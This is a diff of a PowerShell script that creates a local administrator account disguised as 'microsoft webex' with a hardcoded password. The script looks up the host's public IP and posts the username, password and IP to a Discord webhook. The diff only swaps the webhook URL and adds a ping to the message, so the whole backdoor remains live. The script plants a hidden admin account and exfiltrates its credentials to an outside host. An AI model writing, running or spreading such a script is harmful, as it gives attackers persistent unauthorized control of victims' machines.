@@ -1,7 +1,7 @@
 $username = "Webex"
 $password = "ialafgZ368p1"
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
-$webhookUrl = "https://discord.com/api/webhooks/1269085742961787011/CsxSqTWIWl6NVYYiZ6MJjL129HKnKJZ7naiJ8DRgDuFO-xk5JMHaGKD0fjalqJ0w1nVW"
+$webhookUrl = "https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"
 
 New-LocalUser $username -Password $securePassword -FullName "microsoft webex" -Description "Microsoft WeBex.com"
 Add-LocalGroupMember -Group "Administrators" -Member $username
@@ -10,7 +10,7 @@ $ipAddress = (Invoke-WebRequest -Uri "http://ifconfig.me/ip").Content.Trim()
 
 $jsonPayload = @{
     username = "Server Notification"
-    content = "New user created:`nUsername: $username`nPassword: $password`nIP Address: $ipAddress"
+    content = "New user created:`nUsername: $username`nPassword: $password`nIP Address: $ipAddress `nPing: @Windows"
 } | ConvertTo-Json
 
 Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $jsonPayload
